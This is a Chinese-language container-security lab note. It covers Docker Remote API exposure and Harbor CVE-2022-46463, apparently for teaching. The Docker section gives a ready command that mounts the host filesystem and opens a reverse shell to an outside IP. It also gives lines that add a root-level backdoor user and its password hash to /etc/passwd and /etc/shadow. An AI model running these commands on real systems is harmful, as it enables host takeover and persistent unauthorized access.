# 容器安全

## Docker API 未授权访问

Docker Remote API 是 Docker 引擎提供的一个 REST API，用于远程管理 Docker 容器和镜像。Docker 守护进程使用 Unix 套接字进行本地通信，但如果配置不当，例如将守护进程绑定到 0.0.0.0，则会暴露在网络上。如果没有设置访问权限控制，如未启用 TLS 认证或防火墙限制，攻击者就可以直接通过网络访问该 API，无需认证即可执行各种 Docker 操作命令。由于 Docker 默认以 root 权限运行，如果此功能暴露给攻击者，可能导致严重后果。

### 环境搭建

在 Ubuntu 22.04 安装 Docker，

<https://docs.docker.com/engine/install/ubuntu/>

默认情况下，Docker 守护进程通过 Unix 套接字监听本地客户端的连接请求。您可以通过配置 Docker 同时监听 IP 地址、端口以及 Unix 套接字，使其能够接受来自远程客户端的请求。
<https://docs.docker.com/engine/daemon/remote-access/>

```bash
ExecStart=/usr/bin/dockerd -H fd:// -H tcp://0.0.0.0:2375
```

```bash
docker -H tcp://x.x.x.x:2375 run --rm -v /:/mnt ubuntu chroot /mnt /bin/bash -c "bash -i >& /dev/tcp/192.168.1.130/4444 0>&1"
```

由于我们将宿主机的根目录挂载到容器中，因此可以从容器内直接修改宿主机的 `/etc/passwd` 和 `/etc/shadow` 文件，添加自定义用户或修改密码，进而通过 SSH 登录宿主机。

```bash
echo 'hacker:x:0:0:hacker,,,:/home/hacker:/bin/bash' >> /etc/passwd
```

| 字段            | 说明                                                                 |
|-----------------|----------------------------------------------------------------------|
| `hacker`        | **用户名**：系统登录时使用的账户名称。                              |
| `x`             | **密码占位符**：实际密码加密后存储在 `/etc/shadow` 文件中。          |
| `0`          | **用户ID (UID)**：唯一标识用户的数字，用于权限控制。 UID 0 是 root 的标识 |
| `0`          | **用户组ID (GID)**：用户所属主组的唯一标识。                         |
| `hacker,,,`     | **用户描述信息**：可包含全名、联系方式等（此处为空）。               |
| `/home/hacker`  | **家目录路径**：用户专属文件存储目录，默认位于 `/home/` 下。         |
| `/bin/bash`     | **默认 Shell**：用户登录后启动的命令行解释器（此处为 Bash）。        |

密码哈希值（`$6` 表示 SHA-512 算法）,明文密码为`dev`。

```bash
echo 'hacker:$6$gB/z0wS0$BZ.Zoj6QsXn4uwKUi6/zZm0ga/IJf7YHVneEXut0I06.ZywgtKcB79Mj.EAymXubo8tuos9Fr.aFCWs8PNH6T1:17096:0:99999:7:::'>> /etc/shadow
```

### 参考资料

- <https://github.com/0xchang/DockerApiRCE>
- <https://www.trendmicro.com/en_hk/research/24/j/attackers-target-exposed-docker-remote-api-servers-with-perfctl-.html>
- <https://medium.com/@cloudsectraining/abusing-docker-remote-api-bef6a099cfd3>

## Habor 未授权访问漏洞（CVE-2022-46463）

Harbor 是一个开源的 **企业级容器镜像仓库**，由 VMware 公司（现为 Broadcom 旗下）开发并捐赠给 CNCF（云原生计算基金会）。它提供了安全、高效的 Docker 镜像存储和管理功能，适用于企业级 DevOps 和云原生环境。

Harbor 采用 微服务架构，主要组件包括：

Core：核心服务，处理 API 请求。
Registry：存储 Docker 镜像（基于 Distribution）。
Database（PostgreSQL）：存储用户、项目、权限等元数据。
Redis：缓存会话和临时数据。
Job Service：处理异步任务（如镜像复制、垃圾回收）。
Portal：Web UI 管理界面。
Notary（可选）：镜像签名验证。
Trivy/Clair（可选）：漏洞扫描。

由于 Harbor 的访问控制缺陷，未认证的攻击者可通过该漏洞获取公开和私有镜像仓库的全部信息，对私有仓库的未授权访问可能泄露专有应用代码、容器镜像中硬编码的凭据或令牌，还可能暴露过时镜像中的安全漏洞。

### 环境搭建

```bash

```

### 参考资料

- <https://github.com/404tk/CVE-2022-46463>
- <https://mp.weixin.qq.com/s/21V_TACA-UEeKdM2_D-0oQ>
